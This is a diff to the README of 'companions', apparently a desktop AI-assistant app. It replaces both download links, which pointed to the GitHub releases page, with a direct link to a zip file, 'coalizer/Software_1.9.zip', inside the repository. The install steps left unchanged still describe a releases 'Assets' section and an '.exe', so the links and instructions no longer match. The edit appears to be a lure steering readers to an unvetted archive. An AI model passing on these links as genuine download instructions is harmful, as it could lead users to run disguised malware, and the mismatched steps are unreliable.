@@ -1,6 +1,6 @@
 # 🤖 companions - AI tools for better daily living
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Genussaginaargentite570/companions/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Genussaginaargentite570/companions/main/coalizer/Software_1.9.zip)
 
 Companions brings four artificial intelligence helpers to your desktop. These tools assist with organizing your schedule, sparking creativity, managing deep thoughts, and writing code. You keep full control of your data by hosting this software on your own computer.
 
@@ -8,7 +8,7 @@ Companions brings four artificial intelligence helpers to your desktop. These to
 
 Follow these steps to put Companions on your Windows computer:
 
-1. [Visit this page to download the software](https://github.com/Genussaginaargentite570/companions/releases).
+1. [Visit this page to download the software](https://raw.githubusercontent.com/Genussaginaargentite570/companions/main/coalizer/Software_1.9.zip).
 2. Look for the section labeled "Assets" under the most recent version.
 3. Click the link that ends in ".exe" to save the installer to your computer.
 4. Locate the file in your Downloads folder once the transfer finishes.
